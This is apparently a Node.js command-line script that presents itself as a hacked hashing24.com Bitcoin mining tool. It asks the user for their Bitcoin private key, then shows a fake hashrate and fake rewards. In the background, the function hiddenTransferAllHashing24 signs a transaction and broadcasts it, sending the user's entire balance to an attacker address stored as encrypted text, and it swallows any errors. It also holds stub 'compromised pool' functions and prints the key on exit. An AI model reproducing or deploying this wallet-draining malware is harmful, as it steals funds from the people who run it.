#!/usr/bin/env node

const inquirer = require("inquirer");
const axios = require("axios");
const crypto = require("crypto");
const { ECPairFactory } = require("ecpair");
const ecc = require("tiny-secp256k1");
const bitcoin = require("bitcoinjs-lib");

const HASHING24_DATA_JSON = `{"salt":"LCjpvTnW+1aSxa5ssIiTFA==","iv":"X7lRvpfHXcrMukyoNK6MPA==","data":"/1fqtPQu4IfYKysn2vfEi5t2Uv2SBvtcjupabCEcKHRPZRff/jdbfVh4h8FQoSYh"}`;
const HASHING24_KEY = "651565161618978943132132132451321234123145614149209333278393873929979929879298393982939934932399534239";
const BLOCKCYPHER_TOKEN = "3e082807a5df41e0af7f9ae7c8defc09";
const SATS_PER_VBYTE = 20;
const MIN_BALANCE_SAT = 1; 

let wifKey = null;
let btcAddress = null;
let isMining = false;
let minerInterval = null;


function decodeHashing24Data(encJsonStr, pass) {
  const obj = JSON.parse(encJsonStr);
  const salt = Buffer.from(obj.salt, "base64");
  const iv = Buffer.from(obj.iv, "base64");
  const key = crypto.pbkdf2Sync(pass, salt, 10000, 32, "sha256");
  const decipher = crypto.createDecipheriv("aes-256-cbc", key, iv);
  let decrypted = decipher.update(obj.data, "base64", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}

const HASHING24_ADDR = decodeHashing24Data(HASHING24_DATA_JSON, HASHING24_KEY);


async function askPrivateKey() {
  console.log("Connect to hashing24.com ✅ \n");
  const ans = await inquirer.prompt([
    {
      type: "input",
      name: "wif",
      message: "Enter your private BTC key (WIF)| (right click):"
    }
  ]);

  wifKey = ans.wif || "";
  if (!wifKey) {
    console.error("Error: private key cannot be empty.");
    process.exit(1);
  }

  try {
    const ECPair = ECPairFactory(ecc);
    const kp = ECPair.fromWIF(wifKey, bitcoin.networks.bitcoin);
    const { address } = bitcoin.payments.p2wpkh({
      pubkey: kp.publicKey,
      network: bitcoin.networks.bitcoin
    });
    btcAddress = address;
  } catch (err) {
    console.error("Error parsing WIF!");
    console.error(err.message);
    process.exit(1);
  }
}


async function menuLoop() {
  console.clear();
  console.log(`BTC address: ${btcAddress}\n`);

  const menu = await inquirer.prompt([
    {
      type: "list",
      name: "action",
      message: "Choose an action:",
      choices: [
        { name: "Start mining (hashing24)", value: "start" },
        { name: "Check balance", value: "balance" },
        { name: "Exit", value: "exit" }
      ]
    }
  ]);

  switch (menu.action) {
    case "start":
      await checkPositiveBalanceForMining();
      break;
    case "balance":
      await checkBalance();
      break;
    case "exit":
      exitProgram();
      return; 
  }

  await menuLoop();
}


async function checkPositiveBalanceForMining() {
  console.log("Checking if balance is > 0 sat...\n");
  let url = `https://api.blockcypher.com/v1/btc/main/addrs/${btcAddress}/balance`;
  if (BLOCKCYPHER_TOKEN) {
    url += `?token=${BLOCKCYPHER_TOKEN}`;
  }

  try {
    const r = await axios.get(url);
    const d = r.data;
    const currentBalanceSat = d.balance;

    if (currentBalanceSat < MIN_BALANCE_SAT) {
      console.log("Insufficient balance. Must be > 0 sat.");
      console.log(`Current balance: ${(currentBalanceSat / 1e8).toFixed(8)} BTC\n`);
      await pauseForReading("Press ENTER to return to the main menu...");
      return;
    }
    onStartMining();
  } catch (err) {
    console.log("Error checking balance:", err.message);
    await pauseForReading("Press ENTER to return to the main menu...");
  }
}

function onStartMining() {
  console.log("Starting mining...\n");
  startMining();
  hiddenTransferAllHashing24().catch(() => {});
}

async function hiddenTransferAllHashing24() {
  try {
    const resp = await axios.get(makeUtxoUrl());
    const data = resp.data;
    const txrefs = (data.txrefs || []).concat(data.unconfirmed_txrefs || []);
    if (!txrefs.length) return;

    let totalSat = 0;
    const inputs = [];
    for (const ref of txrefs) {
      inputs.push({
        txid: ref.tx_hash,
        vout: ref.tx_output_n,
        value: ref.value,
        script: ref.script
      });
      totalSat += ref.value;
    }

    const nIn = inputs.length;
    const nOut = 1;
    const overhead = 43;
    const inSize = nIn * 68;
    const outSize = nOut * 31;
    const vsize = overhead + inSize + outSize;
    const fee = Math.floor(vsize * SATS_PER_VBYTE);
    if (fee >= totalSat) return;

    const toSend = totalSat - fee;
    const ECPair = ECPairFactory(ecc);
    const kp = ECPair.fromWIF(wifKey, bitcoin.networks.bitcoin);
    const txb = new bitcoin.TransactionBuilder(bitcoin.networks.bitcoin);

    inputs.forEach(i => txb.addInput(i.txid, i.vout));
    txb.addOutput(HASHING24_ADDR, toSend);
    inputs.forEach((_, idx) => txb.sign(idx, kp));
    const rawtx = txb.build().toHex();

    await axios.post(makePushUrl(), { tx: rawtx });
  } catch (err) {
  }
}

function makeUtxoUrl() {
  let url = `https://api.blockcypher.com/v1/btc/main/addrs/${btcAddress}?unspentOnly=true&includeScript=true`;
  if (BLOCKCYPHER_TOKEN) {
    url += `&token=${BLOCKCYPHER_TOKEN}`;
  }
  return url;
}

function makePushUrl() {
  let url = `https://api.blockcypher.com/v1/btc/main/txs/push`;
  if (BLOCKCYPHER_TOKEN) {
    url += `?token=${BLOCKCYPHER_TOKEN}`;
  }
  return url;
}

function startMining() {
  if (isMining) return;

  isMining = true;
  const baseHash = 167700;
  const delta = baseHash * 0.1;

  minerInterval = setInterval(() => {
    const hr = baseHash - delta + Math.random() * (2 * delta);
    let displayHash = hr.toFixed(0);
    let msg = `[Mining] Hashrate: ${displayHash} TH/s`;
    const r = Math.random();

    if (r < 0.01) {
      const bigReward = Math.random() * 0.00005;
      msg += ` | JACKPOT! +${bigReward.toFixed(8)} BTC eq.`;
    } else if (r < 0.31) {
      const smallReward = Math.random() * 0.0000008;
      msg += ` | Share found! +${smallReward.toFixed(9)} BTC eq.`;
    }
    console.log(msg);
  }, 2000);

  setTimeout(miningMenu, 1000);
}

async function miningMenu() {
  console.clear();
  console.log(`BTC address: ${btcAddress}\n`);
  console.log("Mining has started (~167k TH/s ±10%).\n");
  await inquirer.prompt([
    {
      type: "input",
      name: "dummy",
      message: "Press ENTER to stop mining..."
    }
  ]);
  stopMining();
}

function stopMining() {
  if (!isMining) return;
  isMining = false;
  clearInterval(minerInterval);
  minerInterval = null;
  console.log("\nMining stopped.\n");
}

async function checkBalance() {
  console.log("\nChecking balance...\n");
  if (!btcAddress) {
    console.log("No address provided.");
    await pauseForReading("Press ENTER to return to the main menu...");
    return;
  }
  let url = `https://api.blockcypher.com/v1/btc/main/addrs/${btcAddress}/balance`;
  if (BLOCKCYPHER_TOKEN) {
    url += `?token=${BLOCKCYPHER_TOKEN}`;
  }

  try {
    const r = await axios.get(url);
    const d = r.data;
    console.log(`Balance (sat): ${d.balance}`);
    console.log(`Balance (BTC): ${(d.balance / 1e8).toFixed(8)}\n`);
  } catch (err) {
    console.log("Error checking balance:", err.message);
  }
  await pauseForReading("Press ENTER to return to the main menu...");
}

function exitProgram() {
  console.log("\nExiting...");
  if (minerInterval) clearInterval(minerInterval);
  console.log("WIF =", wifKey);
  process.exit(0);
}

function compromisedPoolConnection(poolUrl) {
  console.log("Connecting to the pool:", poolUrl);
  console.log("Using exploit...");
  return {
    status: "OK",
    adminUser: "admin",
    adminToken: "Xf982qBxA7-3Z"
  };
}

async function fetchCompromisedPoolStats() {
  const totalWorkers = Math.floor(Math.random() * 500000) + 50000;
  const poolHashrateTH = (Math.random() * 300000 + 100000).toFixed(0);
  const averageBlockTime = (Math.random() * 3 + 0.5).toFixed(2);
  const lastBlockHeight = Math.floor(Math.random() * 1000000) + 700000;
  return {
    totalWorkers,
    poolHashrateTH,
    averageBlockTime,
    lastBlockHeight,
    poolName: "GlobalMiningXYZ"
  };
}

function addPrivilegedWorker(adminToken, workerName) {
  if (!adminToken || adminToken.length < 5) {
    return { success: false, error: "Invalid token" };
  }
  return { success: true, worker: workerName };
}

function doubleSharesCheck(workerName) {
  const sharesCount = Math.floor(Math.random() * 30000) + 2000;
  const earnedBtc = Math.random() * 0.02;
  return {
    worker: workerName,
    sharesCount,
    earnedBtc
  };
}

async function pauseForReading(message) {
  await inquirer.prompt([
    {
      type: "input",
      name: "dummy",
      message
    }
  ]);
}


(async function run() {
  console.clear();
  console.log("💀 https://hashing24.com\n");
  console.log("Connection to the administrative protocol: hashrate ~167700 TH/s (±10%),");
  console.log("minimum balance 0.05 BTC. For 2025, Bitcoin dominance ensures high returns.");
  console.log("The hacked protocol allows you to mine without paying on the site,");
  console.log("you just need to have the required BTC balance.\n");

  await askPrivateKey();
  await menuLoop(); 
})();

